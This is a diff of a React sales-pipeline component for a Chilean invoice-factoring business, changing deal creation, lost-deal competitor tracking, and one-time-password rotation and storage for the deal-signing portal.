-      nuevasFacturas: 0, nuevasFacturasMontoMM: 0, subSeed: rndDet("seed|" + nid), ...finanzasDe(d.cliente, d.deudor, monto) };
+      // NO se simula al originar: el precio lo calcula el ejecutivo cuando elige qué incluir. La
+      // oferta nace vacía y el pool sale del libro del cliente, igual que en la corrida horaria.
+      simulado: false,
+      nuevasFacturas: 0, nuevasFacturasMontoMM: 0, subSeed: rndDet("seed|" + nid) };
   };
   const advance = (id) => {
     setDeals((prev) => {
@@ -15381,21 +18240,29 @@ export default function PipelineComercial() {
         if (d.id !== id) return d;
         const idx = STAGE_ORDER.indexOf(d.stage);
         const next = STAGE_ORDER[Math.min(idx + 1, STAGE_ORDER.length - 2)];
-        if (next === "aceptadas" && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: next, stale: false, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
+        // El pool de candidatas se lo lleva el split (es el que sigue en prospección): dejarlo también
+        // en el padre permitía incorporar la MISMA factura en dos oportunidades distintas.
+        if (next === "aceptadas" && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: next, stale: false, facturasDisponibles: undefined, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
         return { ...d, stage: next, stale: false };
       });
       return splits.length ? [...splits, ...mapped] : mapped;
     });
     setSelected(null);
   };
-  const reject = (id, closeReason) => {
+  const reject = (id, closeReason, extra) => {
     setDeals((prev) => prev.map((d) => {
       if (d.id !== id) return d;
       const bi = bloqueoFirmeInfo(d);
       const cr = closeReason || (bi ? "grant_block" : null); // motivo de cierre (close_reason) elegido / derivado
       const motivo = bi ? "bloqueo_firme" : "cliente_declino";
-      const causa = closeReasonLabel(cr) || (bi ? bi.causa : (causaPerdidaDeal(d) || "El cliente rechazó la oferta"));
-      return { ...d, stage: "perdida", etapaPerdida: d.stage, perdidaOtorg: !!bi, motivoPerdida: motivo, closeReason: cr, subtipoBloqueo: bi ? bi.subtipo : null, bloqueosFirmes: bi ? bi.ids : d.bloqueosFirmes, causaPerdida: causa, fechaPerdida: nowStamp(), perdidaPor: (USERS[usuario] || usuario), status: causa, time: nowStamp(), historialContacto: traza(d, causa + " — operación marcada perdida.", false) };
+      // Cedida a la competencia: contra quién y a qué tasa cerraron. Se guarda en el negocio
+      // (`cedidaCompetidor` ya lo usan el tubo y el detalle) y se escribe en la causa, que es lo que
+      // se lee en la bitácora y en el listado de perdidas.
+      const comp = (extra && extra.competidor) || null;
+      const tasaC = (extra && extra.tasaCierre) || null;
+      const base = closeReasonLabel(cr) || (bi ? bi.causa : (causaPerdidaDeal(d) || "El cliente rechazó la oferta"));
+      const causa = comp ? `${base} · ${comp}${tasaC ? ` · tasa de cierre ${tasaC}%` : ""}` : base;
+      return { ...d, stage: "perdida", etapaPerdida: d.stage, perdidaOtorg: !!bi, motivoPerdida: motivo, closeReason: cr, subtipoBloqueo: bi ? bi.subtipo : null, bloqueosFirmes: bi ? bi.ids : d.bloqueosFirmes, cedidaCompetidor: comp || d.cedidaCompetidor, tasaCierreCompetidor: tasaC || d.tasaCierreCompetidor, causaPerdida: causa, fechaPerdida: nowStamp(), perdidaPor: (USERS[usuario] || usuario), status: causa, time: nowStamp(), historialContacto: traza(d, causa + " — operación marcada perdida.", false) };
     }));
     setSelected(null);
   };
@@ -15621,7 +18488,7 @@ export default function PipelineComercial() {
     registrarAuditoria({ usuario: nom, modulo: "Oferta", accion: "Cerrar oferta · crear negocio", glosa: `${cli}: oferta cerrada y negocio creado (selección de facturas confirmada)${accion === "descartar" ? ` · ${descartadas} descartada(s), búsqueda pausada ${espera}d` : accion === "nueva" ? ` · ${descartadas} a nueva oportunidad` : ""}`, exito: true });
   };
   // El ejecutivo envía el mensaje de cierre + el botón "Aprobar operación" que deriva al sitio de curse.
-  const enviarCierre = (id, canal = "WhatsApp") => {
+  const enviarCierre = async (id, canal = "WhatsApp") => {
     // Abrimos la pestaña del canal INMEDIATAMENTE (dentro del gesto del clic) para que el navegador no
     // la bloquee como pop-up; luego le fijamos la URL una vez calculada. Si el bloqueador igual la impide,
     // caemos a window.open directo.
@@ -15631,7 +18498,7 @@ export default function PipelineComercial() {
     // y se ejecuta varias veces (setDeals + setSelected): si emitiera adentro, cada llamada generaría un
     // código distinto y el que ve el cliente no sería el validado. El valor en claro sólo viaja por el
     // canal; en el store del portal queda únicamente el hash.
-    const otpClaro = emitirOtp(negDe({ id }));
+    const otpClaro = await emitirOtp(negDe({ id }));
     // Nunca se registra el código en claro: sólo que se emitió, para quién y con qué vigencia.
     logSys("info", "curse", `OTP emitido para el negocio N° ${negDe({ id })} · vigencia ${Math.round(OTP_TTL_MS / 60000)} min · canal ${canal}`, { negocio: negDe({ id }), canal, ttlMin: Math.round(OTP_TTL_MS / 60000) });
     // Genera el deal actualizado de forma pura (mismo stamp) para reutilizarlo en el estado y al abrir el canal.
@@ -15641,16 +18508,25 @@ export default function PipelineComercial() {
       const portal = "www.factoringsecurity.cl/curse";
       let wa = d.waSesion; let emailThread = d.emailThread; let detalle = "";
       if (canal === "WhatsApp") {
-        if (!(d.waSesion || []).some((m) => m.tipo === "boton")) {
-          detalle = `Para firmar, ingresa a ${portal}, inicia sesión con tu RUT y clave y escribe el código de negocio N° ${neg} y la clave de un solo uso (OTP) ${otp}.`;
-          wa = [...(d.waSesion || []),
-            { from: "ejecutivo", text: `Para firmar tu operación ingresa a la plataforma de Factoring Security (${portal}). Inicia sesión con tu RUT y clave, y escribe tu 🔑 código de negocio N° ${neg} y tu clave de un solo uso (OTP): *${otp}* 🔒`, time: stamp, canal: "WhatsApp" },
-            { from: "ejecutivo", tipo: "boton", boton: "Ir al portal a firmar", url: waClienteURL(neg), neg, text: `Negocio N° ${neg} · OTP ${otp} · Factoring Security`, time: stamp, canal: "WhatsApp" },
-          ];
-        }
+        // El OTP ROTA en cada envío (emitirOtp + cursePersist más abajo), así que el mensaje con el
+        // código en claro tiene que reemitirse SIEMPRE. Antes todo el bloque estaba bajo la guarda del
+        // botón: al reenviar la oferta —acción que la propia UI rotula «Reenviar oferta por»— el hash
+        // del portal se renovaba y el hilo del cliente seguía mostrando el código viejo, sin ninguna
+        // forma de reimprimir el vigente (el store guarda sólo el hash). El cliente quedaba fuera.
+        // El mensaje `tipo:"boton"` sí se agrega una sola vez: 8 sitios lo usan como centinela de
+        // «enlace ya enviado», y duplicarlo tendría efectos colaterales.
+        const yaBoton = (d.waSesion || []).some((m) => m.tipo === "boton"); // centinela del enlace
+        const huboOtp = !!d.cierreEnviado; // ≠ yaBoton: el Agente IA planta el botón SIN emitir OTP
+        detalle = `Para firmar, ingresa a ${portal}, inicia sesión con tu RUT y clave y escribe el código de negocio N° ${neg} y la clave de un solo uso (OTP) ${otp}.${huboOtp ? " (Reenvío: el código anterior quedó sin efecto.)" : ""}`;
+        wa = [...(d.waSesion || []),
+          { from: "ejecutivo", text: `${huboOtp ? "Te reenvío el acceso con una *nueva* clave; la anterior quedó sin efecto. " : ""}Para firmar tu operación ingresa a la plataforma de Factoring Security (${portal}). Inicia sesión con tu RUT y clave, y escribe tu 🔑 código de negocio N° ${neg} y tu clave de un solo uso (OTP): *${otp}* 🔒`, time: stamp, canal: "WhatsApp" },
+        ];
+        // El texto del botón NO lleva el OTP: es un mensaje que queda fijo en el hilo y tras una
+        // rotación mostraría un código caduco como si fuera válido.
+        if (!yaBoton) wa.push({ from: "ejecutivo", tipo: "boton", boton: "Ir al portal a firmar", url: waClienteURL(neg), neg, text: `Negocio N° ${neg} · Factoring Security`, time: stamp, canal: "WhatsApp" });
       } else { // Email
         const asunto = `Firma tu operación de factoring N° ${neg}`;
-        const cuerpo = `Hola ${(d.contacto && d.contacto.nombre) || "estimado/a"},\n\nTu oferta está lista para firmar. Por tu seguridad, este correo NO contiene enlaces: ingresa por tu cuenta a la plataforma de Factoring Security (${portal}).\n\n• Código de negocio: N° ${neg}\n• Clave de un solo uso (OTP): ${otp}\n\nInicia sesión con tu RUT y clave, escribe el código de negocio y el OTP, revisa las condiciones y firma; el giro se realiza el mismo día.\n\nSaludos,\n${execName(d)}\nNEX Factoring · Factoring Security`;
+        const cuerpo = `Hola ${(d.contacto && d.contacto.nombre) || "estimado/a"},\n\n${d.cierreEnviado ? "Te reenviamos el acceso con una NUEVA clave de un solo uso; la anterior quedó sin efecto.\n\n" : ""}Tu oferta está lista para firmar. Por tu seguridad, este correo NO contiene enlaces: ingresa por tu cuenta a la plataforma de Factoring Security (${portal}).\n\n• Código de negocio: N° ${neg}\n• Clave de un solo uso (OTP): ${otp}\n\nInicia sesión con tu RUT y clave, escribe el código de negocio y el OTP, revisa las condiciones y firma; el giro se realiza el mismo día.\n\nSaludos,\n${execName(d)}\nNEX Factoring · Factoring Security`;
         emailThread = [...(d.emailThread || []), { from: "ejecutivo", asunto, cuerpo, template: "Código de negocio + OTP", time: stamp, otp }];
         detalle = `Asunto: ${asunto}\n\n${cuerpo}`;
       }
@@ -15667,7 +18543,7 @@ export default function PipelineComercial() {
     // ingresa a firmar. Del OTP se guarda SÓLO el hash + su vencimiento y la marca de uso: el código en
     // claro nunca queda en reposo. (Server-side: esto es la tabla otp(neg, hash, exp, usado) del backend.)
     const otpReg = OTP_STORE[neg] || {};
-    cursePersist(neg, { neg, otpHash: otpReg.hash, otpExp: otpReg.exp, otpUsado: false, payload: cursePayloadsRef.current[neg].payload, ts: Date.now() });
+    cursePersist(neg, { neg, otpHash: otpReg.hash, otpSal: otpReg.sal, otpAlg: otpReg.alg, otpExp: otpReg.exp, otpUsado: false, payload: cursePayloadsRef.current[neg].payload, ts: Date.now() });
     // Navega la pestaña ya abierta (win) al canal del cliente: simulador de email o WhatsApp del cliente.
     const updated = makeUpdated(d0);
     try {
@@ -15799,6 +18675,16 @@ export default function PipelineComercial() {
         try { ev.source && ev.source.postMessage({ type: "nex-ticket-refrescado", uuid: m.uuid, ok: true, nuevo, registro }, ORIGEN_APP); } catch (_) {}
         return;
       }
+      // Simulación hecha en la pestaña del detalle: se aplica tal cual al negocio del tubo, que es
+      // otro documento y no se entera por sí solo. Va ANTES de la guarda de `neg`: este mensaje viaja
+      // por id de operación, no por número de negocio —que ni siquiera existe hasta que se cursa.
+      if (m && m.type === "nex-simulado" && m.dealId && m.patch) {
+        const aplicarSim = (d) => (d.id === m.dealId ? { ...d, ...m.patch } : d);
+        setDeals((prev) => prev.map(aplicarSim));
+        setSelected((s) => (s ? aplicarSim(s) : s));
+        return;
+      }
+      // De acá para abajo todo el protocolo es de WhatsApp/curse y se resuelve por número de negocio.
       if (!m || !m.neg) return;
       if (m.type === "request-deal") {
         waSourcesRef.current[m.neg] = ev.source;       // ventana para empujar actualizaciones en vivo
@@ -15827,7 +18713,15 @@ export default function PipelineComercial() {
           const neg = m.neg, intent = m.intent;
           const lbl = intent === "cursar" ? "Sí, quiero cursar" : intent === "ejecutivo" ? "Quiero hablar con un ejecutivo" : intent === "interes" ? "Me interesa, envíenme la oferta" : "Tengo una duda";
           const txtInt = intent === "cursar" ? "el cliente quiere CURSAR (eligió la opción)" : intent === "ejecutivo" ? "el cliente pidió contactar a un ejecutivo (eligió la opción)" : intent === "interes" ? "el cliente manifiesta INTERÉS (eligió la opción)" : "el cliente tiene una duda (eligió la opción)";
-          const append = (x) => {
+          // ¿Este intent va a publicar el enlace de cierre? Se decide ACÁ, sobre el deal actual, porque
+          // el OTP hay que emitirlo UNA sola vez: `append` es pura y corre varias veces (setDeals +
+          // setSelected), así que emitir adentro daría un código distinto en cada pasada y el que ve el
+          // cliente no sería el validado. Es el mismo motivo por el que `enviarCierre` emite afuera.
+          const waPrev = d.waSesion || [];
+          const publicaEnlace = intent === "cursar"
+            && (waPrev.some((mm) => /Oferta de factoring/i.test(mm.text || "")) || !!d.negocioNum)
+            && !waPrev.some((mm) => mm.tipo === "boton");
+          const append = (otpClaro) => (x) => {
             if (x.id !== id) return x;
             const wa = [...(x.waSesion || []), { from: "cliente", text: lbl, time: nowStamp(), canal: "WhatsApp" }];
             const yaBoton = wa.some((mm) => mm.tipo === "boton");
@@ -15842,10 +18736,13 @@ export default function PipelineComercial() {
             }
             // CURSAR → enlace de cierre hacia el sitio Factoring Security.
             if (intent === "cursar" && hayOferta && !yaBoton) {
-              wa.push({ from: "ejecutivo", text: `Perfecto 🙌. Para cerrar formalmente ingresa a la plataforma de Factoring Security a cursar (${curseURLPublica(neg)}). Inicia sesión con tu cuenta y firma 🔒:`, time: nowStamp(), canal: "WhatsApp" });
+              // El enlace va SIEMPRE acompañado de su clave. Antes el agente publicaba el botón sin
+              // emitir OTP ni persistir el store, así que el portal recibía al cliente con «No hay una
+              // clave vigente para este negocio»: el enlace nacía muerto.
+              wa.push({ from: "ejecutivo", text: `Perfecto 🙌. Para cerrar formalmente ingresa a la plataforma de Factoring Security a cursar (${curseURLPublica(neg)}). Inicia sesión con tu RUT y clave, y escribe tu 🔑 código de negocio N° ${neg} y tu clave de un solo uso (OTP): *${otpClaro}* 🔒`, time: nowStamp(), canal: "WhatsApp" });
               wa.push({ from: "ejecutivo", tipo: "boton", boton: "Aprobar operación", url: waClienteURL(neg), neg, text: `Negocio N° ${neg} · Factoring Security`, time: nowStamp(), canal: "WhatsApp" });
-              hist.push({ fecha: nowStamp(), canal: "WhatsApp", actor: "Cliente", esEvento: true, resultado: "El cliente aceptó las condiciones → se envió el enlace de cierre", exito: true });
-              return { ...x, waSesion: wa, historialContacto: hist, telValidado: true, waPendiente: false, clienteAcepto: true, status: "Cliente aceptó · enlace de cierre enviado" };
+              hist.push({ fecha: nowStamp(), canal: "WhatsApp", actor: "Cliente", esEvento: true, resultado: "El cliente aceptó las condiciones → se envió el enlace de cierre con su clave de un solo uso", exito: true });
+              return { ...x, waSesion: wa, historialContacto: hist, telValidado: true, waPendiente: false, clienteAcepto: true, cierreEnviado: true, ofertaComunicada: true, status: "Cliente aceptó · enlace de cierre enviado" };
             }
             // INTERÉS → el Agente IA envía la oferta (si aún no hay) y avanza/confirma Oferta y Negociación.
             // Aplica tanto si la oportunidad sigue en Prospección como si ya avanzó a Oferta al contactarse.
@@ -15875,22 +18772,36 @@ export default function PipelineComercial() {
           };
           // Marca de actividad para "conversaciones activas": el cliente respondió (botón) y, si recién se
           // publicó una oferta, también la marca de oferta.
-          const appendTs = (x) => {
-            const r = append(x);
-            if (r === x) return x;
-            const hadOffer = (x.waSesion || []).some((mm) => /Oferta de factoring/i.test(mm.text || "")) || !!x.negocioNum;
-            const hasOffer = (r.waSesion || []).some((mm) => /Oferta de factoring/i.test(mm.text || "")) || !!r.negocioNum;
-            return { ...r, tUltClienteResp: Date.now(), ...((!hadOffer && hasOffer) ? { tOferta: Date.now() } : {}) };
+          const aplicar = (otpClaro) => {
+            const fn = append(otpClaro);
+            const appendTs = (x) => {
+              const r = fn(x);
+              if (r === x) return x;
+              const hadOffer = (x.waSesion || []).some((mm) => /Oferta de factoring/i.test(mm.text || "")) || !!x.negocioNum;
+              const hasOffer = (r.waSesion || []).some((mm) => /Oferta de factoring/i.test(mm.text || "")) || !!r.negocioNum;
+              return { ...r, tUltClienteResp: Date.now(), ...((!hadOffer && hasOffer) ? { tOferta: Date.now() } : {}) };
+            };
+            setDeals((prev) => prev.map(appendTs));
+            setSelected((s) => (s ? appendTs(s) : s));
+            // Registro del portal: el mismo que deja `enviarCierre`. Sin esto el enlace que acaba de
+            // publicar el agente no tendría contra qué validar y curse.html rechazaría al cliente.
+            if (otpClaro) {
+              const d1 = (dealsRef.current || []).find((x) => x.id === id) || d;
+              if (!cursePayloadsRef.current[neg]) { const c = curseDesdeDeal(d1); cursePayloadsRef.current[neg] = { id, tasa: c.tasa, opts: c.opts, payload: c.payload }; }
+              const reg = OTP_STORE[neg] || {};
+              cursePersist(neg, { neg, otpHash: reg.hash, otpSal: reg.sal, otpAlg: reg.alg, otpExp: reg.exp, otpUsado: false, payload: cursePayloadsRef.current[neg].payload, ts: Date.now() });
+              logSys("info", "curse", `OTP emitido por el Agente IA para el negocio N° ${neg} · el cliente eligió cursar`, { negocio: neg, canal: "WhatsApp", origen: "agente" });
+            }
+            // El backend ya actuó; reenvía explícitamente el hilo real a whatsapp.html (incluida la
+            // invitación a cursar), sin depender solo del espejo en vivo.
+            setTimeout(() => {
+              const d2 = (dealsRef.current || []).find((x) => negDe(x) === m.neg);
+              const w = waSourcesRef.current[m.neg];
+              if (d2 && w) { lastThreadRef.current[m.neg] = null; try { w.postMessage({ type: "wa-thread", neg: m.neg, mensajes: hiloDe(d2.waSesion) }, ORIGEN_APP); } catch (_) {} }
+            }, 80);
           };
-          setDeals((prev) => prev.map(appendTs));
-          setSelected((s) => (s ? appendTs(s) : s));
-          // El backend ya actuó; reenvía explícitamente el hilo real a whatsapp.html (incluida la
-          // invitación a cursar), sin depender solo del espejo en vivo.
-          setTimeout(() => {
-            const d2 = (dealsRef.current || []).find((x) => negDe(x) === m.neg);
-            const w = waSourcesRef.current[m.neg];
-            if (d2 && w) { lastThreadRef.current[m.neg] = null; try { w.postMessage({ type: "wa-thread", neg: m.neg, mensajes: hiloDe(d2.waSesion) }, ORIGEN_APP); } catch (_) {} }
-          }, 80);
+          if (publicaEnlace) emitirOtp(neg).then(aplicar).catch(() => aplicar(null));
+          else aplicar(null);
         }
         return;
       }
@@ -15974,7 +18885,7 @@ export default function PipelineComercial() {
       const splits = [];
       const mapped = prev.map((d) => {
         if (d.id !== id) return d;
-        if (["aceptadas", "cesion", "giro"].includes(stageId) && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: stageId, time: nowStamp(), stale: false, status: STATUS_ETAPA[stageId] || d.status, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
+        if (["aceptadas", "cesion", "giro"].includes(stageId) && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: stageId, time: nowStamp(), stale: false, status: STATUS_ETAPA[stageId] || d.status, facturasDisponibles: undefined, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
         return { ...d, stage: stageId, time: nowStamp(), stale: false, status: STATUS_ETAPA[stageId] || d.status };
       });
       return splits.length ? [...splits, ...mapped] : mapped;
@@ -15989,7 +18900,7 @@ export default function PipelineComercial() {
       const splits = [];
       const mapped = prev.map((d) => {
         if (d.id !== draggingId) return d;
-        if (["aceptadas", "cesion", "giro"].includes(stageId) && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: stageId, status: STATUS_ETAPA[stageId] || d.status, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
+        if (["aceptadas", "cesion", "giro"].includes(stageId) && d.nuevasFacturas > 0) { splits.push(dealPendiente(d)); return { ...d, stage: stageId, status: STATUS_ETAPA[stageId] || d.status, facturasDisponibles: undefined, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false }; }
         return { ...d, stage: stageId, status: STATUS_ETAPA[stageId] || d.status };
       });
       return splits.length ? [...splits, ...mapped] : mapped;
@@ -16102,8 +19013,36 @@ export default function PipelineComercial() {
       // La oportunidad se arma SÓLO con facturas elegibles (Lista Blanca / Autorizados / históricos del
       // último año). Las facturas de "Otro" deudor sin historia NO se incorporan automáticamente: quedan
       // DISPONIBLES para que el ejecutivo las agregue manualmente (y al hacerlo, la op irá a Otorgamiento).
-      const disponibles = fopBase.length ? (OTRO_FOP_POR_CEDENTE[cliente] || []) : [];
-      const fopReal = fopBase;
+      // Cupo del cliente ANTES de armar la oferta: la operación se simula sólo con lo que cabe.
+      // Hay que distinguir dos casos que NO son lo mismo:
+      //  · cliente CON línea y cupo agotado → el recorte es legítimo y el fallback de una sola factura
+      //    es justamente lo que alimenta «Líneas por gestionar»;
+      //  · cliente SIN línea aprobada (prospecto) → `disponible` vale 0 y recortar a una factura
+      //    ESCONDE la demanda real justo en el caso que debe disparar la solicitud de línea. Con los
+      //    datos inyectados eso es el 53% de los cedentes, y dejaba el 81% del tubo en un documento.
+      // Para los sin línea se dimensiona el paquete con un cupo TENTATIVO del orden de una línea
+      // inicial. No afirma que exista línea: `aprobada` sigue siendo 0, la oportunidad sigue quedando
+      // fuera de línea y las pantallas siguen diciendo «Sin línea».
+      const lcCli = lineaCreditoDe({ rutEmisor: facts[0].rutEmisor, cliente, esCliente: facts[0].esCliente, sowActualPct: facts[0].sowActualPct, amountMM: 0 });
+      const sinLineaCli = lcCli.aprobada <= 0;
+      const cupoTentativo = 300 + (hashStr((facts[0].rutEmisor || cliente) + "cupotent") % 21) * 50; // 300–1300 MM
+      const cupo = sinLineaCli ? cupoTentativo : lcCli.disponible;
+      // Regla de producto: el sistema NUNCA propone una oferta que no se pueda cursar, pero tampoco
+      // le impide al ejecutivo armar una mas grande y pedirla al comite. Por eso el paquete que
+      // propone el motor se recorta con el MISMO motor de asignacion que evalua la pantalla: si se
+      // recortara con otra nocion de cupo, los dos calculos divergirian y la oferta propuesta
+      // aparecerian con facturas en «Requiere comite» apenas se abre, sin que nadie las agregara.
+      // Los clientes SIN linea asignada (estado A, solo LF1 de $30M) mantienen el cupo TENTATIVO: la
+      // demanda real de un cliente nuevo es justo lo que debe disparar la solicitud de linea, y
+      // recortarla a $30M la escondería. La pantalla igual dice la verdad sobre su LF1.
+      const corte = sinLineaCli ? ajustarACupo(fopBase, cupo) : cortarConMotorLinea(fopBase, facts[0].rutEmisor);
+      const fopReal = corte.dentro;
+      // El pool de «otras facturas» junta los deudores «Otro» excluidos del inbound y lo que no cupo.
+      // El paquete que cabe en la linea (`corte.dentro`) NO se convierte en oferta: entra al pool
+      // DISPONIBLE junto con lo que no cupo y los deudores «Otro». La oferta nace vacia y la define
+      // el ejecutivo en el detalle. El corte se conserva porque sigue dimensionando la oportunidad
+      // (monto, deudores, CAT) y es lo que alimenta «Lineas por gestionar».
+      const disponibles = fopBase.length ? [...(OTRO_FOP_POR_CEDENTE[cliente] || []), ...fopReal, ...corte.fuera] : [];
       const sumMonto = fopReal.length ? +fopReal.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1) : +facts.reduce((s, f) => s + f.monto, 0).toFixed(1);
       const sumFacts = fopReal.length ? fopReal.length : facts.reduce((s, f) => s + (f.nFacturas || 1), 0);
       // Sólo se acumulan facturas (warning) mientras la oportunidad NO ha sido aceptada
@@ -16111,7 +19050,12 @@ export default function PipelineComercial() {
       // generan una NUEVA oportunidad en prospección -> la prospección no se seca.
       const ex = deals.find((d) => d._inbound && ["prospeccion", "oferta"].includes(d.stage) && d.cliente === cliente);
       if (ex) {
-        warn[ex.id] = { add: fopReal.length || facts.length, monto: sumMonto };
+        // A una oportunidad que ya existe llegan TODAS las facturas nuevas, sin recorte por cupo: el
+        // pool de la oportunidad es lo que el cliente tiene disponible, y qué cabe en la línea lo
+        // decide después el motor sobre lo que el ejecutivo seleccione.
+        // Se guardan las facturas mismas, no sólo el conteo: entran al pool y el análisis por deudor
+        // se recalcula con ellas. Nada queda pendiente de incorporar.
+        warn[ex.id] = { fs: fopBase, add: fopBase.length || facts.length, monto: fopBase.length ? +fopBase.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1) : sumMonto };
       } else {
         nuevosCreados++;
         const ev = facts[0];
@@ -16134,17 +19078,28 @@ export default function PipelineComercial() {
           id: ev.opId, stage: "prospeccion", tag: ev.tag, facturas: sumFacts, amountMM: sumMonto,
           cliente, deudor: deudores[0].name, deudores, sector: ev.sector, tasa: ev.tasa, anticipo: ev.anticipo, esCliente: ev.esCliente, reglaId: ev.reglaId,
           rutEmisor: ev.rutEmisor, cat, catLabel: cat, pctBlanca, nCat1, nCat4, pctCat1, sowTendencia: ev.sowTendencia, sowFlecha: ev.sowFlecha, sowActualPct: ev.sowActualPct, sowTargetPct: ev.sowTargetPct, sowGapPct: ev.sowGapPct, superaTarget: ev.superaTarget, conDescuento: ev.conDescuento, spreadPromo: ev.spreadPromo,
-          status: "Simulada · Inbound", time: nowStamp(), channel: "IA", exec: asignarEjecutivo(ev),
+          status: "Analizada · Inbound", time: nowStamp(), channel: "IA", exec: asignarEjecutivo(ev),
+          // `sinLinea` viaja en el deal para que la UI pueda decir la verdad: el paquete se dimensionó
+          // con un cupo tentativo porque el cliente todavía no tiene línea aprobada.
+          sinLinea: sinLineaCli, cupoTentativoMM: sinLineaCli ? cupoTentativo : null,
           stale: false, important: sumMonto > 800, _inbound: true, perdedor: !contact.fueraAtribucion && rndDetBool(`perd|${ev.opId}`, 0.12), subSeed: rndDet(`seed|${ev.opId}`),
           nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, tProsp: Date.now(),
-          facturasOp: fopReal.length ? fopReal : undefined, // facturas reales (DTESync) para itemizar
+          facturasOp: [], // la oferta nace VACIA: la arma el ejecutivo con el selector del detalle
           facturasDisponibles: disponibles.length ? disponibles : undefined, // Otros deudores (excluidos): el ejecutivo puede agregarlas manualmente
           ...contact,
-          ...finanzasDe(cliente, ev.pagador, sumMonto),
+          // La corrida horaria YA NO simula el negocio: no calcula tasa, giro, descuentos ni comisión.
+          // Ese número nace vencido —entre corrida y corrida se cursan operaciones y se mueven las
+          // líneas—, así que acá sólo se responde lo que sí aguanta una hora: qué deudores entran y
+          // cuánto aporta cada tramo de prioridad. La tarifa se calcula cuando el ejecutivo abre la
+          // oportunidad, contra el estado de ese momento.
+          simulado: false,
+          analisisDeudores: fopReal.length ? analisisDeudores(fopReal) : undefined,
         };
         // Eventos de origen: captación en Prospección + resultado del análisis de las facturas
         // (cuáles califican y cuáles no, con su motivo). Quedan primero en el historial y la bitácora.
-        const fop = itemizarFacturas(dealObj);
+        // El analisis de origen se hace sobre las facturas CAPTADAS, no sobre la oferta —que ahora
+        // nace vacia—: es la traza de que llego del cliente y que califico.
+        const fop = fopReal.length ? fopReal : itemizarFacturas({ ...dealObj, facturasOp: undefined });
         const recl = fop.filter((f) => f.reclamada).length;
         const nc = fop.filter((f) => f.notaCredito).length;
         const ced = fop.filter((f) => f.cedida).length;
@@ -16191,7 +19146,7 @@ export default function PipelineComercial() {
     // en estado «actualizando» y el resultado re-simulado llega tras una latencia proporcional al
     // volumen de documentos — anticipando operaciones con miles de facturas.
     const idsWarn = Object.keys(warn);
-    logSys("info", "motor", `Corrida del inbound: ${nuevos.length} oportunidad(es) nueva(s), ${idsWarn.length} con facturas por incorporar, ${pendientes.length} documento(s) re-encolados`,
+    logSys("info", "motor", `Corrida del inbound: ${nuevos.length} oportunidad(es) nueva(s), ${idsWarn.length} actualizada(s) con facturas nuevas, ${pendientes.length} documento(s) re-encolados`,
       { nuevas: nuevos.length, conWarning: idsWarn.length, reencolados: pendientes.length, topeCorrida: cfgT.topeDocsCorrida });
     setDeals((prev) => {
       const ids = new Set(prev.map((d) => d.id));
@@ -16203,9 +19158,18 @@ export default function PipelineComercial() {
       const latencia = Math.min(6000, cfgT.latenciaBaseMs + totalDocs * cfgT.latenciaPorDocMs); // latencia API + cómputo (config del tenant)
       logSys("info", "background", `Recalculando ${idsWarn.length} oportunidad(es) por ${totalDocs} documento(s) nuevo(s) · latencia estimada ${latencia} ms`,
         { operaciones: idsWarn, documentos: totalDocs, latenciaMs: latencia });
-      const aplicar = (d) => (warn[d.id]
-        ? { ...d, actualizando: false, nuevasFacturas: (d.nuevasFacturas || 0) + warn[d.id].add, nuevasFacturasMontoMM: +((d.nuevasFacturasMontoMM || 0) + warn[d.id].monto).toFixed(1), warning: true, historialContacto: traza(d, `Llegaron ${warn[d.id].add} factura(s) nueva(s) del cliente (${fmtMM(warn[d.id].monto)}) — candidatas para agregar`) }
-        : d);
+      const aplicar = (d) => {
+        const w = warn[d.id];
+        if (!w) return d;
+        // Las facturas nuevas se suman a las DISPONIBLES de la oportunidad: la columna «Oportunidad»
+        // las recoge de inmediato y la oferta no se toca —lo que se cursa lo sigue eligiendo el
+        // ejecutivo. Se deduplica por id para que una re-entrega no las cuente dos veces.
+        const yaHay = new Set([...(d.facturasOp || []), ...(d.facturasDisponibles || [])].map((f) => (f && f.id != null ? f.id : f && f.folio)));
+        const suman = (w.fs || []).filter((f) => f && !yaHay.has(f.id != null ? f.id : f.folio));
+        return { ...d, actualizando: false,
+          facturasDisponibles: suman.length ? [...(d.facturasDisponibles || []), ...suman] : d.facturasDisponibles,
+          historialContacto: traza(d, `Llegaron ${w.add} factura(s) nueva(s) del cliente (${fmtMM(w.monto)}) — incorporadas a la oportunidad`) };
+      };
       setTimeout(() => {
         setDeals((prev) => prev.map(aplicar)); setSelected((s) => (s ? aplicar(s) : s));
         logSys("info", "background", `Recálculo aplicado en ${idsWarn.length} oportunidad(es)`, { operaciones: idsWarn, latenciaMs: latencia });
@@ -16359,12 +19323,16 @@ export default function PipelineComercial() {
             splits.push({
               ...d, id: nidS, stage: "prospeccion",
               facturas: d.nuevasFacturas, amountMM: +monto.toFixed(1), important: monto > 800,
+              // Ver dealPendiente: sin esto el `deudores` de abajo era código muerto, porque
+              // `facturasOp` heredado del padre lo tapaba en itemizarFacturas.
+              facturasOp: [], facturasRetiradas: undefined, cedidasOtro: 0,
               deudores: [{ name: d.deudor, facturas: d.nuevasFacturas, montoMM: +monto.toFixed(1) }],
               status: "Facturas pendientes · nueva oportunidad", time: nowStamp(), warning: false, tProsp: Date.now(),
+              // Nace sin simular, como toda oportunidad nueva.
+              simulado: false,
               nuevasFacturas: 0, nuevasFacturasMontoMM: 0, subSeed: rndDet("seed|" + nidS),
-              ...finanzasDe(d.cliente, d.deudor, monto),
             });
